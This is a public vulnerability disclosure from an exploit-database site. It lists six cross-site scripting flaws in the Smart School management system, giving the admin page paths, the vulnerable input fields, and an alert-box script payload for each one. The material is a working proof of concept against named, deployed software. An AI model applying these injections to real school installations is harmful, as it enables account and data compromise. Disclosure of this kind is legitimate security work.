---
title: Smart School : School Management System > All vers affected
url: https://cxsecurity.com/issue/WLB-2023030009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-06
fetch_date: 2025-10-04T08:45:06.038945
---

# Smart School : School Management System > All vers affected

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Smart School : School Management System > All vers affected** **2023.03.05**  Credit:  **[Eren Arslan](https://cxsecurity.com/author/Eren%2BArslan/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Title: Smart School : School Management System > All vers affected
# Author: @Eawhitehat - Eren Arslan
# Vendor: https://smart-school.in/
# Demo available : https://demo.smart-school.in/site/login#
# Software Link: https://smart-school.in/
# CVE: N/A
# Multiple XSS
- XSS 1 :
Connect to panel Smart School panel,
Paste to search : "><script>alert(/eawhitehat is here/)</script>
- XSS 2 :
Connect to panel Smart School Panel,
Go to /admin/generalcall
In the "name" enter the following payload:
"><script>alert(/eawhitehat is here/)</script>
The rest of the information can be wrong information then save
- XSS 3 :
Connect to panel Smart School Panel,
Go to /admin/dispatch
In the "title" enter the following payload:
"><script>alert(/eawhitehat is here/)</script>
The rest of the information can be wrong information then save
- XSS 4 :
Connect to panel Smart School Panel,
Go to /admin/receive
In the "title" enter the following payload:
"><script>alert(/eawhitehat is here/)</script>
The rest of the information can be wrong information then save
- XSS 5 :
Connect to panel Smart School Panel,
Go to /admin/complaint
In the "Complain By" enter the following payload:
"><script>alert(/eawhitehat is here/)</script>
The rest of the information can be wrong information then save
- XSS 6 :
Connect to panel Smart School Panel,
Go to /admin/visitorspurpose
In the "Purpose" enter the following payload:
"><script>alert(/eawhitehat is here/)</script>
The rest of the information can be wrong information then save

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 -1

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top